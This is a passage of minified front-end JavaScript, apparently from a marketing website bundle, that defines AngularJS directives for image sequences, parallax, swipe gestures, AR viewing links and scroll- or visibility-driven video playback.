i=window.devicePixelRatio,r=1440;return[1440,1144,760,480].forEach((t=>{e<=t&&(r=t)})),t.match(/\=/)?t+="-w":t+="=w",t+=parseInt(r*i*this.multiplier)}isNonFife(t){return/\.(gif|jpg|jpeg|tiff|png|svg)$/i.test(t)}isNonUrl(t){return""==t||!t}cleanFifeParams(t){return this.isNonFife(t)||this.isNonUrl(t)?t:t.replace(/\=.*/,"")}processImage(t){if("string"==typeof t&&yo(t)){let e=Ww.default.isWebpSupported();t=this.cleanFifeParams(t),t=this.appendFifeParams(t,e),t=this.appendFifeWidth(t)}return t}},wi=Uw,zw=class{static get $inject(){return["$rootScope","$element","$scope","$window"]}constructor(t,e,i,r){this.$window=r,this.$scope=i,this.$rootScope=t,this.$element=e,this.el=e[0],this.ev=Kd.elementVisibility.inview(this.el,{rootMargin:"100px"}),this.cssVar_=this.el.getAttribute("data-css-progress-var")||null,this.delayImageLoad=!yr.evBypassEnabled()&&!!this.el.getAttribute("data-delay-image-load")||null,this.ariaLabel=this.el.getAttribute("data-sequence-aria-label")||null,this.wombatImage=new wi(1),this.domWatcher=new Hw.DomWatcher,this.domWatcher.add({element:window,on:"scroll",callback:Vi.func.throttle((()=>this.onScroll()),48),runWhen:()=>this.ev.state().ready&&this.ev.state().inview,eventOptions:{passive:!0},id:"scroll"}),this.sequenceCanvas=new Gw.WebGlImageSequence(this.el,[{images:this.getProcessedSrcs_()}],{ariaLabel:this.ariaLabel}),this.onFirstLoadEv=Kd.elementVisibility.inview(this.el,{rootMargin:2*window.innerHeight+"px"},((t,e,i)=>{if(e.isIntersecting){let t=()=>{let t=[];t.push(this.sequenceCanvas.load()),Promise.all(t).then((()=>{this.el.classList.add("loaded"),this.sequenceCanvas.renderByProgress(this.rafProgress.currentProgress)}))};this.delayImageLoad?Vi.dom.runAfterNotTopOfScreen((()=>{t()})):t(),i()}})),this.rafProgress=new Vi.RafProgress((t=>this.onProgressUpdate(t)));let n=this.getProgress();this.rafProgress.setCurrentProgress(n),this.domWatcher.run("scroll"),this.domWatcher.run("resize"),i.$on("$destroy",(()=>this.dispose()))}getProcessedSrcs_(){let t=Vi.is.supportingWebp();return JSON.parse(this.el.getAttribute("data-sequence")).map((e=>this.wombatImage.appendFifeParams(e,t)))}onScroll(){let t=this.getProgress();this.rafProgress.easeTo(t,.16,Vi.EASE.linear)}getProgress(){return null!==this.cssVar_?parseFloat(vt(this.el,this.cssVar_)):Vi.dom.getElementScrolledPercent(this.el)}onProgressUpdate(t){this.sequenceCanvas.renderByProgress(t)}dispose(){this.ev.dispose(),this.onFirstLoadEv.dispose(),this.domWatcher.dispose(),this.sequenceCanvas.dispose()}},mD=()=>({restrict:"A",controller:zw}),jw=mD,Yw=class{static get $inject(){return["$element","$scope","$attrs","$window"]}constructor(t,e,i,r){this.$scope=e,this.el=t[0],this.$window=r,this.rl_=de.getDestroyableInstance(),this.completeClass=i.mqnMinHeightScanComplete,this.items=Array.from(this.el.querySelectorAll("[mqn-min-height-item]")),this.variables=Array.from(this.el.querySelectorAll("[mqn-min-height-variable]")),this.windowSize=window.innerWidth,this.calculate_(),this.resizeDebouncer=null;let n=t=>{this.windowSize!==window.innerWidth&&(window.clearTimeout(this.resizeDebouncer),this.resizeDebouncer=window.setTimeout((()=>{this.windowSize=window.innerWidth,this.calculate_()}),300))};window.MQN_RESIZER?(window.MQN_RESIZER.addListener(n),this.windowListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(n)}):(r.addEventListener("resize",n),this.windowListener=()=>{r.removeEventListener("resize",n)}),e.$on("$destroy",(()=>{this.dispose_()}))}calculate_(){let t=0;this.el.classList.remove(this.completeClass),this.el.style.opacity=0,this.items.forEach((t=>{let e=t.querySelector("[mqn-min-height-variable]");e.style.maxHeight="",e.style.opacity="0"})),window.setTimeout((()=>{this.rl_.measure((()=>{let e=0;this.items.forEach((i=>{let r=window.getComputedStyle(i),n=i.offsetHeight+parseInt(r.getPropertyValue("margin-top"))+parseInt(r.getPropertyValue("margin-bottom")),s=i.querySelector("[mqn-min-height-variable]");s.style.maxHeight=s.offsetHeight+"px",s.style.opacity="";let o=window.getComputedStyle(s),a=s.offsetHeight+parseInt(o.getPropertyValue("margin-top"))+parseInt(o.getPropertyValue("margin-bottom"));e=Math.max(e,a),t+=n-a})),t+=e})),this.rl_.mutate((()=>{this.el.classList.add(this.completeClass),this.el.style.minHeight=t+"px",this.el.style.maxHeight="",this.el.style.opacity=1}))}))}dispose_(){this.windowListener&&this.windowListener(),this.rl_.destroy()}},gD=function(){return{restrict:"A",controller:Yw}},Xw=gD,Zd=ye(gt());function Qw(){return{restrict:"A",scope:{mqnViewInAr:"="},link:(t,e)=>{let i=t.mqnViewInAr;if(!i||"object"!=typeof i)return;if(!i.glb)return void console.error('"glb" is required');let r=e[0];if(Zd.is.android()){let t={file:i.glb};i.title&&(t.title=i.title),i.link&&i.link.startsWith("http")&&(t.link=i.link);let e=new URLSearchParams(t).toString(),n="intent://arvr.google.com/scene-viewer/1.1?"+e+"#Intent;scheme=https;package=com.google.android.googlequicksearchbox;action=android.intent.action.VIEW;S.browser_fallback_url="+("https://arvr.google.com/scene-viewer?"+e)+";end;";r.href=n}else if(Zd.is.ios()&&i.usdz)r.addEventListener("click",(()=>{let t=document.createElement("img"),e=document.createElement("a");t.style.display="none",e.appendChild(t),e.setAttribute("href",i.usdz),e.setAttribute("rel","ar"),e.click()}));else{let t=new Kw(i);r.addEventListener("click",(()=>t.open()))}}}}var Kw=class{constructor(t){this.glb=t.glb,this.usdz=t.usdz,this.isOpen=!1,this.modalEl=null}open(){if(this.isOpen)return;let t=document.createElement("button");t.classList.add(te.mqnCssName("mqn2-view-in-ar-modal__x")),t.addEventListener("click",(()=>{this.close()}));let e=document.createElement("model-viewer");e.setAttribute("ar",""),e.setAttribute("src",this.glb),this.usdz&&e.setAttribute("ios-src",this.usdz),e.setAttribute("shadow-intensity","1"),e.setAttribute("camera-controls",""),e.setAttribute("auto-rotate",""),e.setAttribute("style","");let i=document.createElement("div");i.classList.add(te.mqnCssName("mqn2-view-in-ar-modal")),i.appendChild(t),i.appendChild(e),document.body.appendChild(i),this.modalEl=i,this.isOpen=!0}close(){!this.isOpen||(console.log("ViewInArModal.close()"),document.body.removeChild(this.modalEl),this.isOpen=!1)}dispose(){this.close()}},vD=function(){return{restrict:"A",link:function(t,e,i){let r=e[0],n=Tt.makeSmithCooperateWithNativeSticky(r);t.$on("$destroy",(()=>{n&&n.done()}))}}},Zw=vD,tE=ye(gt()),rE=ye(Jt()),yD=eE(),iE=class{static get $inject(){return["$element","$scope","$attrs","$timeout","$window","$rootScope"]}constructor(t,e,i,r,n,s){this.el=t[0],this.$scope=e,this.$rootScope=s,this.config=JSON.parse(i.mqnParallax),this.raf=null,this.instances=[],this.observer=null,this.windowY=null,this.raf=new tE.Raf((()=>{this.instances.forEach((t=>{t.update()}))})),this.observer=rE.elementVisibility.inview(this.el,null,((t,e,i)=>{e.isIntersecting?this.raf.start():this.raf.stop()})),window.setTimeout((()=>{this.config.forEach((t=>{this.instances.push(this.createSingleBasicScroll_(t))}))})),this.resizeHandler_=()=>this.recalculate(),window.addEventListener("resize",this.resizeHandler_),e.$on("MQN2_PARALLAX_STOP",(()=>{this.raf.stop()})),e.$on("MQN2_PARALLAX_UPDATE",(()=>{this.instances.forEach((t=>{t.update()}))})),e.$on("MQN2_PARALLAX_CALCULATE",(()=>{this.recalculate()})),this.$scope.$on("MQN2_EQUAL_HEIGHTS_INITIALIZED",(()=>{this.recalculate()})),e.$on("MQN2_PARALLAX_START",(()=>{this.raf.start()})),e.$on("$destroy",(()=>{this.dispose_()}))}recalculate(){this.instances.forEach((t=>{t.calculate()}))}createSingleBasicScroll_(t){return t.elem=this.el,t.direct=!0,yD.create(t)}dispose_(){this.raf&&this.raf.stop(),this.observer&&this.observer.dispose(),this.instances.forEach((t=>{t.destroy()})),window.removeEventListener("resize",this.resizeHandler_)}},_D=function(){return{restrict:"A",controller:iE}},nE=_D,bD=function(){return{restrict:"A",scope:{mqnRewriteLinkTargets:"&",mqnRewriteLinkTargetsTarget:"&"},link:function(t,e,i){let r=e[0],n=i.mqnRewriteLinkTargetsTarget,s=r.querySelectorAll("a[href]");[].forEach.call(s,(function(t){t.getAttribute("href").startsWith("/")&&(t.target=n)}))}}},sE=bD,wD=function(){return{restrict:"A",scope:{mqnSwipe:"&",mqnSwipeLeft:"&",mqnSwipeRight:"&",mqnSwipeUp:"&",mqnSwipeDown:"&"},link:function(t,e,i){let r=e[0],n=+i.mqnSwipeDebounce||300,s=!1,o=!1,a=null,l=null,h="ontouchstart"in document.documentElement,c=t=>{a=t.touches&&t.touches[0].clientX||t.x,l=t.touches&&t.touches[0].clientY||t.y,o=!0},u=t=>{o=!1},d=e=>{if(!a||!l||s||!o)return;s=!0;let i=e.touches&&e.touches[0].clientX||e.x,r=e.touches&&e.touches[0].clientY||e.y,h=i-a,c=r-l;Math.abs(h)>Math.abs(c)?h>0?t.$apply((()=>{t.mqnSwipeLeft()})):t.$apply((()=>{t.mqnSwipeRight()})):c>0?t.$apply((()=>{t.mqnSwipeUp()})):t.$apply((()=>{t.mqnSwipeDown()})),window.setTimeout((()=>{s=!1,o=!1}),n),i=null,r=null};h?(r.addEventListener("touchstart",c,{passive:!0}),r.addEventListener("touchmove",d,{passive:!0}),r.addEventListener("touchend",u,{passive:!0})):(r.addEventListener("mousedown",c,{passive:!0}),r.addEventListener("mousemove",d,{passive:!0}),r.addEventListener("mouseup",u,{passive:!0})),t.$on("$destroy",(()=>{r.removeEventListener("touchstart",c),r.removeEventListener("touchmove",d),r.removeEventListener("touchend",u),r.removeEventListener("mousedown",c),r.removeEventListener("mouseup",u)}))}}},oE=wD,aE=ye(nc()),lE=ye(Nt()),zc=ye(gt()),ED=0;function SD(){return Symbol(ED++)}function AD(t){return t.replace(/\./g,"")}var cE=class{constructor(t,e,i,r,n){this.cssClass_=t,this.noReset_=e,this.fireOnce_=i,this.fired_=!1,this.ranges_=[],this.scrubbable_=r,this.dispatchInviewEvent_=n,this.hasReset_=!0}isDone(){return this.fired_&&this.fireOnce_}addConfig(t,e){zc.is.defined(t.from)&&"end"==t.from&&(t.from=e.duration),this.ranges_.push(new Ae(zc.is.defined(t.from)?t.from:-1/0,zc.is.defined(t.to)?t.to:1/0))}update(t,e,i){this.scrubbable_&&"0"===vt(e,"opacity")||(this.shouldFire(e)?(this.dispatchInviewEvent_&&i&&!this.fired_&&i.$broadcast("mqn-inview-in",{inview:!0}),this.fired_=!0,Fi(t,this.cssClass_),this.hasReset_=!1):this.fireOnce_||Ni(t,this.cssClass_))}shouldFire(t){return!!this.ranges_.some((e=>e.contains(t.currentTime)))}reset(t){!this.noReset_&&!this.hasReset_&&(Ni(t,this.cssClass_),this.hasReset_=!0)}resetFiredState(t){this.fired_=!1,Ni(t,this.cssClass_)}},uE=class{static get $inject(){return["$element","$attrs","$scope","mqnVideoCssTriggerTargetCollection"]}constructor(t,e,i,r){this.mqnVideoCssTriggerTargetCollection_=r;let n=JSON.parse(e.mqnVideoCssTriggers);if(this.id_=e.mqnVideoCssTriggersId||SD(),this.ngScope_=i,this.rl_=de.getDestroyableInstance(),n.length){if(this.triggers=Hn.usingFunction((([t,e,i,r,n])=>new cE(AD(t),e,i,r,n))),this.video=t[0],this.domWatcher=new lE.DomWatcher,this.domWatcher.add({element:document,on:"visibilitychange",callback:this.visibilityChange.bind(this),eventOptions:{passive:!0}}),!e.mqnVideoCssTriggersId){let t=Tt.getClosestMqnFrame(this.video).children[0];this.registeredTargetElement_=t,this.mqnVideoCssTriggerTargetCollection_.addTarget(this.id_,t)}this.raf=new aE.default((()=>this.update())),i.$on("$destroy",(()=>this.dispose_())),this.video.addEventListener("timeupdate",(()=>this.update())),this.video.addEventListener("pause",(()=>this.raf.stop())),this.video.addEventListener("play",(()=>this.raf.start())),this.video.addEventListener("loadedmetadata",(()=>{this.init_(n)}))}else console.warn("Video CSS Triggers invoked without triggers. Config:",n)}init_(t){t.forEach((t=>{t.classes.forEach((e=>{this.triggers.get([e,t.no_reset,t.fire_once,t.scrubbable,t.dispatch_inview_event]).addConfig(t,this.video)}))}))}getAllTriggers(){return Array.from(this.triggers.values())}getTargetElements_(){return this.mqnVideoCssTriggerTargetCollection_.getTargets(this.id_).map((t=>t.getElement()))}reset(){this.getAllTriggers().filter((t=>!t.isDone())).forEach((t=>{this.getTargetElements_().forEach((e=>t.reset(e)))}))}visibilityChange(){this.video.hasAttribute("mqn-lazyimage-video-no-play")||(document.hidden?this.getAllTriggers().forEach((t=>{this.getTargetElements_().forEach((e=>t.resetFiredState(e)))})):(this.video.currentTime=0,this.video.play().then((()=>{})).catch((t=>{}))))}update(){this.rl_.measure((()=>{if(!Ot(this.video,!0))return;0===this.video.currentTime&&this.reset();let t=this.getTargetElements_();this.getAllTriggers().forEach((e=>{t.forEach((t=>{e.update(t,this.video,this.ngScope_)}))}))}))}dispose_(){this.registeredTargetElement_&&this.mqnVideoCssTriggerTargetCollection_.disposeTarget(this.id_,this.registeredTargetElement_),this.rl_.destroy()}},CD=function(){return{restrict:"A",controller:uE}},hE=CD,fE=ye(gt()),dE=class{static get $inject(){return["$element","$attrs","$scope","$timeout","$window"]}constructor(t,e,i,r,n){this.$window=n,this.video=t[0],this.canplaythrough=!1,this.isPlaying=!1,this.inview=!1,this.offset=+e.mqnVideoInviewPlayTopOffset||0,this.playDelay=+e.mqnVideoInviewPlayDelay||0,this.playStartClass=e.mqnVideoInviewPlayStartClass,this.playInviewClass=e.mqnVideoInviewPlayInviewClass,this.playEndClass=e.mqnVideoInviewPlayEndClass,this.waitForScroll=!yr.evBypassEnabled()&&"true"==e.mqnVideoInviewPlayWaitForScroll,this.$scope=i,(this.playStartClass||this.playEndClass||this.playInviewClass)&&(this.partialRoot=Tt.getClosestMqnFrame(this.video).children[0]),this.init(),i.$on("$destroy",(()=>{this.dispose_()}))}init(){Et.elementInViewWatcherFirstChangeOnly(this.video,{threshold:this.offset},((t,e,i)=>{e.isIntersecting&&(this.inview=e.isIntersecting),this.runCheck(),window.setTimeout((()=>{this.$scope.$apply()}))})),Et.elementInViewWatcherFirstChangeOnly(this.video,{},((t,e,i)=>{e.isIntersecting||(this.inview=e.isIntersecting),this.runCheck(),window.setTimeout((()=>{this.$scope.$apply()}))})),window.addEventListener("scroll",(()=>{window.setTimeout((()=>{this.hasScrolled=!0,this.runCheck(),this.$scope.$apply()}))}),{once:!0,passive:!0});let t=fE.is.firefox()?"canplay":"canplaythrough";this.video.addEventListener(t,(()=>{this.canplaythrough=!0,this.runCheck()}),{once:!0});let e=()=>{this.playEndClass&&this.partialRoot.classList.add(this.playEndClass)};this.video.addEventListener("ended",e),this.videoEndListener=()=>{this.video.removeEventListener("ended",e)}}runCheck(){this.waitForScroll&&!this.hasScrolled||(this.inview&&this.canplaythrough&&!this.isPlaying&&(this.playInviewClass&&this.partialRoot.classList.add(this.playInviewClass),this.playDelay&&window.setTimeout((()=>{this.video.pause(),this.video.currentTime=0})),window.setTimeout((()=>{let t=this.video.play();this.video.classList.add("play-start"),this.isPlaying=!0,t.then((()=>{this.playStartClass&&this.partialRoot.classList.add(this.playStartClass)})).catch((t=>{this.isPlaying=!1}))}),this.playDelay)),!this.inview&&this.canplaythrough&&this.isPlaying&&this.canReset()&&(this.isPlaying=!1,this.video.pause(),this.video.currentTime=0,this.playInviewClass&&this.partialRoot.classList.remove(this.playInviewClass),this.playStartClass&&this.partialRoot.classList.remove(this.playStartClass),this.playEndClass&&this.partialRoot.classList.remove(this.playEndClass)))}canReset(){return!this.video.hasAttribute("mqn-video-inview-no-reset")}dispose_(){this.videoEndListener&&this.videoEndListener()}},TD=function(){return{restrict:"A",controller:dE}},pE=TD,mE=ye(Nt()),gE=class{static get $inject(){return["$element","$attrs","$scope"]}constructor(t,e,i){this.el=t[0],this.playing=!1,this.pauseVideo(),this.domWatcher=new mE.DomWatcher,this.domWatcher.add({element:this.el,on:"mouseenter",callback:()=>{this.playVideo()}}),this.domWatcher.add({element:this.el,on:"mouseleave",callback:()=>{this.pauseVideo()}}),i.$on("$destroy",(()=>{this.dispose()}))}playVideo(){this.el.play().then((()=>{})).catch((t=>{}))}pauseVideo(){this.el.pause()}dispose(){this.domWatcher.dispose()}},xD=function(){return{restrict:"A",controller:gE}},vE=xD,yE=class{static get $inject(){return["$element","$attrs","$scope","$timeout","$window"]}constructor(t,e,i,r,n){this.el=t[0],this.id=e.mqnVideoIntroLoop,this.loopEl=document.getElementById(this.id),this.loopVideos=[...this.loopEl.querySelectorAll("video")],this.el.addEventListener("play",(()=>{this.el.style.opacity=1,this.loopEl.style.opacity=0})),this.el.addEventListener("ended",(()=>{this.el.pause(),this.loopVideos.forEach((t=>{t.currentTime=0,t.play().then((()=>{})).catch((t=>{}))})),this.el.style.opacity=0,this.loopEl.style.opacity=1}))}},ID=function(){return{restrict:"A",controller:yE}},_E=ID;function zr(t,e){return void 0===e&&(e=null),null!==e?Ir(t)-Ir(e):Ir(t)}function jc(t,e){return void 0===e&&(e=null),zr(t,e)+sr.fromElementOffset(t).height-sr.fromElementOffset(e).height}function Yc(t,e){void 0===e&&(e=null);var i=null!==e?e.offsetHeight:gi.clientHeight;return zr(t,e)+t.offsetHeight/2-i/2}function Xc(t){return function(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return-1*t.apply(void 0,e)}}var ni=function(){function t(){}return t.DISTANCE_FROM_DOCUMENT_TOP=Xc(Ir),t.DISTANCE_FROM_DOCUMENT_CENTER=Xc(Yc),t.DISTANCE_FROM_DOCUMENT_BOTTOM=Xc(jc),t.DOCUMENT_SCROLL=function(){return window.pageYOffset||er.scrollTop},t}(),PD=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r};function _o(t,e){return PD(t.slice(0,t.indexOf(e)),t.slice(t.indexOf(e)+1))}var Yn={condition:null,distanceCallbacks:[],percentCallbacks:[],getDistanceFunction:ni.DISTANCE_FROM_DOCUMENT_CENTER,startDistance:function(){return Number.NEGATIVE_INFINITY},endDistance:function(){return Number.POSITIVE_INFINITY},effects:[]},Qc=new ti,OD=function(){function t(t,e,i){this.distance=t,this.distanceAsPercent=e,this.clientHeight=gi.clientHeight,this.clientWidth=gi.clientWidth,this.lastRunValue=i}return t.prototype.shouldTriggerRun=function(){return null===this.lastRunValue||this.distance!==this.lastRunValue.distance||this.clientHeight!==this.lastRunValue.clientHeight||this.clientWidth!==this.lastRunValue.clientWidth},t.prototype.getRunRangeAsPercent=function(){var t=null!==this.lastRunValue?this.lastRunValue.distanceAsPercent:0;return Ae.fromUnorderedValues(t,this.distanceAsPercent)},t.prototype.getRunRange=function(){var t=null!==this.lastRunValue?this.lastRunValue.distance:0;return Ae.fromUnorderedValues(t,this.distance)},t}(),jr=function(){function t(e,i){var r=void 0===i?Yn:i,n=r.condition,s=void 0===n?Yn.condition:n,o=r.distanceCallbacks,a=void 0===o?Yn.distanceCallbacks:o,l=r.percentCallbacks,h=void 0===l?Yn.percentCallbacks:l,c=r.getDistanceFunction,u=void 0===c?Yn.getDistanceFunction:c,d=r.startDistance,p=void 0===d?Yn.startDistance:d,m=r.endDistance,f=void 0===m?Yn.endDistance:m,g=r.effects,y=void 0===g?Yn.effects:g;null===e&&ct.throw("ScrollEffect requires a valid HTMLElement as a target"),this.condition_=s,this.distanceCallbacks_=t.mapCallbacksFromCallbackOptions_(a),this.percentCallbacks_=t.mapCallbacksFromCallbackOptions_(h),this.target_=e,this.getDistanceFunction_=u,this.startDistance_=p,this.endDistance_=f,this.effects_=y,this.runValue_=null,this.destroyed_=!1,this.forceRun_=!1,this.init_()}return t.prototype.init_=function(){var t=this;this.effects_.forEach((function(e){return Qc.get(e).push(t)})),"complete"===document.readyState?de.measure((function(){return t.triggerRun()})):window.addEventListener("load",(function(){return de.measure((function(){return t.triggerRun()}))})),de.scrollMeasure((function(){return t.handleScroll_()}))},t.mapCallbacksFromCallbackOptions_=function(t){var e=(t instanceof ti?Array.from(t.entries()):t).map((function(t){var e=t[0],i=t[1];return e instanceof Ae?[e,i]:e instanceof Array?[new Ae(e[0],e[1]),i]:[new Ae(e,e),i]}));return new ti(e)},t.prototype.handleScroll_=function(){var t=this;this.destroyed_||de.scrollMeasure((function(){t.triggerRun(),de.scrollCleanup((function(){return t.handleScroll_()}))}))},t.prototype.forceRun=function(){var t=this;this.forceRun_||(this.forceRun_=!0,this.triggerRun(),de.cleanup((function(){return t.forceRun_=!1})))},t.prototype.triggerRun=function(){this.updateRunValue_(),this.shouldRun_()&&(this.runEffects_(),this.runCallbacksForPosition_())},t.prototype.shouldRun_=function(){return!!this.forceRun_||this.isConditionMet_()&&this.runValue_.shouldTriggerRun()},t.prototype.isConditionMet_=function(){return null===this.condition_||this.condition_()},t.prototype.getDistanceValue_=function(t){return"number"==typeof t?t:t(this.target_)},t.prototype.getStartDistance_=function(){return this.getDistanceValue_(this.startDistance_)},t.prototype.getEndDistance_=function(){return this.getDistanceValue_(this.endDistance_)},t.prototype.getDistanceRange_=function(){return new Ae(this.getStartDistance_(),this.getEndDistance_())},t.getCallbacks_=function(t,e){var i=[];return Vr(e.entries(),(function(e){var r=e[0],n=e[1];r.hasOverlap(t)&&i.push.apply(i,n)})),i},t.prototype.updateRunValue_=function(){var t=this.getRunDistance_(),e=this.getDistanceRange_().getValueAsPercent(t),i=isNaN(e)?0:e;this.runValue_=new OD(t,i,this.runValue_)},t.prototype.runCallbacks_=function(t){var e=this,i=this.runValue_.lastRunValue,r=null!==i?i.distance:null,n=null!==i?i.distanceAsPercent:null;t.forEach((function(t){return t(e.target_,e.runValue_.distance,e.runValue_.distanceAsPercent,r,n)}))},t.prototype.runCallbacksForPosition_=function(){var e=t.getCallbacks_(this.runValue_.getRunRangeAsPercent(),this.percentCallbacks_),i=t.getCallbacks_(this.runValue_.getRunRange(),this.distanceCallbacks_);this.runCallbacks_(e.concat(i))},t.prototype.runEffects_=function(){var t=this.effects_.map((function(t){return t.run.bind(t)}));this.runCallbacks_(t)},t.prototype.getRunDistance_=function(){return this.getDistanceRange_().clamp(this.getDistanceFunction_(this.target_))},t.prototype.destroy=function(){var t=this;this.destroyed_=!0,this.effects_.forEach((function(e){_o(Qc.get(e),t),0===Qc.get(e).length&&(Qc.delete(e),e.destroy())}))},t}(),bE=.1,wE=function(){function t(t,e,i){var r=void 0===i?{}:i,n=r.playableTime,s=void 0===n?new Ae(Number.NEGATIVE_INFINITY,Number.POSITIVE_INFINITY):n,o=r.activePercentages,a=void 0===o?new Ae(0,1):o;this.getForwardsVideo_=t,this.getBackwardsVideo_=e,this.targetPercentages_=Xe.usingFunction((function(){return 0})),this.destroyed_=!1,this.wasPlayingForwards_=!0,this.playableTime_=s,this.activePercentages_=a,this.scroll_=_i.getSingleton(this),this.render_()}return t.prototype.run=function(t,e,i){this.targetPercentages_.set(t,i)},t.getTargetTime_=function(t,e,i){var r=i.getOverlap(new Ae(0,t.duration));return null!==r?r.getPercentAsValue(e):0},t.prototype.getReversePlayableTime_=function(t){return new Ae(Math.max(0,t.duration-this.playableTime_.getMax()),Math.min(t.duration,t.duration-this.playableTime_.getMin()))},t.prototype.getAdjustedPercentage_=function(t){return this.activePercentages_.getValueAsPercent(t)},t.prototype.render_=function(){var e=this;this.destroyed_||de.mutate((function(){de.cleanup((function(){return e.render_()})),Array.from(e.targetPercentages_.entries()).forEach((function(i){var r,n,s,o=i[0],a=i[1],l=e.getAdjustedPercentage_(a),h=e.getForwardsVideo_(o),c=e.getBackwardsVideo_(o);if(!isNaN(h.duration)&&!isNaN(c.duration)){var u=t.getTargetTime_(h,l,e.playableTime_),d=t.getTargetTime_(c,1-l,e.getReversePlayableTime_(c)),p=d-c.currentTime<-bE;if(p){if(s=u,n=c,(r=h).currentTime<e.playableTime_.getMin()&&s===e.playableTime_.getMin())return}else s=d,r=c,n=h;if(p!==e.wasPlayingForwards_&&(r.currentTime=r.duration-n.currentTime),n.paused||n.pause(),isNaN(s)||isNaN(r.currentTime)||r.currentTime>=s)r.paused||r.pause();else if(r.readyState>=3){Ie(r,"opacity","1"),Ie(n,"opacity","0");var m=r.currentTime-s;Math.abs(m)<bE?r.currentTime=s:r.play()}n.currentTime=n.duration-r.currentTime,e.wasPlayingForwards_=p}}))}))},t.prototype.destroy=function(){this.destroyed_=!0,this.scroll_.destroy(this)},t}(),Kc=ye(gt()),Wa={FORWARDS_VIDEO:te.mqnCssName("mqn2-lazyvideo__video--forwards"),BACKWARDS_VIDEO:te.mqnCssName("mqn2-lazyvideo__video--reversed"),BACKWARDS_VIDEO_NOT_READY:te.mqnCssName("mqn2-lazyvideo__video--reversed--loading")},RD=function(){return{restrict:"A",link:function(t,e,i){let r=Kc.is.defined(i.mqn2ScrubOnFramePositionMinimumPlayTime)?parseFloat(i.mqn2ScrubOnFramePositionMinimumPlayTime):0,n=Kc.is.defined(i.mqn2ScrubOnFramePositionActivePercentStart)?parseFloat(i.mqn2ScrubOnFramePositionActivePercentStart):0,s=Kc.is.defined(i.mqn2ScrubOnFramePositionActivePercentEnd)?parseFloat(i.mqn2ScrubOnFramePositionActivePercentEnd):1,o=e[0],a=Tt.getClosestMqnFrame(o),l=o.querySelector(`.${Wa.FORWARDS_VIDEO}`),h=o.querySelector(`.${Wa.BACKWARDS_VIDEO}`);h.classList.add(Wa.BACKWARDS_VIDEO_NOT_READY),h.classList.add(Wa.BACKWARDS_VIDEO_NOT_READY);let c=()=>{h.classList.remove(Wa.BACKWARDS_VIDEO_NOT_READY),h.currentTime=h.duration};h.addEventListener("loadedmetadata",c);let u=setInterval((()=>{h.readyState>=3&&(c(),clearInterval(u))}),16),d=new jr(o,{getDistanceFunction:()=>{if(!Ot(o))return 0;let t,e=zr(a),i=Math.abs(window.innerHeight-a.offsetHeight);return t=window.innerHeight>a.offsetHeight?1-new Ae(0,i).clamp(e)/i:Math.abs(new Ae(-i,0).clamp(e)/i),t},effects:[new wE((()=>l),(()=>h),{playableTime:new Ae(r,Number.MAX_VALUE),activePercentages:new Ae(n,s)})],startDistance:0,endDistance:1});t.$on("$destroy",(()=>d.destroy()))}}},EE=RD,SE=class{static get $inject(){return["$element","$attrs","$scope","mqnVideoCssTriggerTargetCollection"]}constructor(t,e,i,r){this.mqnVideoCssTriggerTargetCollection_=r,this.ids_=e.mqnVideoCssTriggersTargetIds.split(" "),this.el_=t[0],this.ids_.forEach((t=>{this.mqnVideoCssTriggerTargetCollection_.addTarget(t,this.el_)})),i.$on("$destroy",(()=>this.dispose_()))}dispose_(){this.ids_.forEach((t=>{this.mqnVideoCssTriggerTargetCollection_.disposeTarget(t,this.el_)}))}},MD=function(){return{restrict:"A",scope:!1,controller:SE}},AE=MD,$D="354x720",CE=class{static get $inject(){return["$element","$scope","$attrs","$window"]}constructor(t,e,i,r){this.$scope=e,this.el=t[0],this.jQuery=window.jQuery,this.partialType=null,this.isMarginRight="left"==i.mqnGridWithDeviceImagesMetaOffset;let n=this.jQuery(this.el).closest("."+te.mqnCssName("mqn2-frame")).children().first();this.deviceEl,n&&(n.hasClass(te.mqnCssName("mqn2-grid-1x1"))?(this.partialType="mqn2-grid-1x1",this.deviceEl=n.find("."+te.mqnCssName("mqn2-grid-1x1__device"))):n.hasClass(te.mqnCssName("mqn2-grid-tabbed"))&&(this.partialType="mqn2-grid-tabbed",this.deviceEl=n.find(`.${te.mqnCssName("mqn2-desktop-tablet-only")} .${te.mqnCssName("mqn2-grid-tabbed__device-images__images")}:first`))),""!==i.mqnDeviceImageAspect?this.aspect=i.mqnDeviceImageAspect.split("x"):this.aspect=$D.split("x"),this.aspect=this.aspect[0]/this.aspect[1],this.resizeDebouncer=null;let s=t=>{this.windowSize!==window.innerWidth&&(window.clearTimeout(this.resizeDebouncer),this.resizeDebouncer=window.setTimeout((()=>{this.calculate_()}),300))};window.MQN_RESIZER?(window.MQN_RESIZER.addListener(s),this.windowListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(s)}):(r.addEventListener("resize",s),this.windowListener=()=>{r.removeEventListener("resize",s)}),e.$on("$destroy",(()=>{this.dispose_()})),this.calculate_()}calculate_(){if(!rt.IS_MOBILE()&&this.deviceEl&&this.deviceEl[0]){let t=this.deviceEl[0].offsetHeight*this.aspect;"mqn2-grid-1x1"===this.partialType&&this.jQuery(this.el).closest("."+te.mqnCssName("mqn2-grid-1x1__section")).hasClass(te.mqnCssName("mqn2-grid-1x1__section--order-desktop-1"))||"mqn2-grid-tabbed"===this.partialType&&!this.jQuery(this.el).closest("."+te.mqnCssName("mqn2-grid-tabbed")).hasClass(te.mqnCssName("mqn2-grid-tabbed--desktop-reversed"))||this.isMarginRight?this.el.style.marginRight=t/2+"px":this.el.style.marginLeft=t/2+"px",this.el.style.width="auto"}else this.jQuery(this.el).closest("."+te.mqnCssName("mqn2-grid-1x1__section")).hasClass(te.mqnCssName("mqn2-grid-1x1__section--order-desktop-1"))?this.el.style.marginRight=null:this.el.style.marginLeft=null,this.el.style.width=null}dispose_(){this.windowListener&&this.windowListener()}},LD=function(){return{restrict:"A",controller:CE}},TE=LD;function qt(t){return t.reduce((function(t,e){return t.concat(e)}),[])}var DD=new 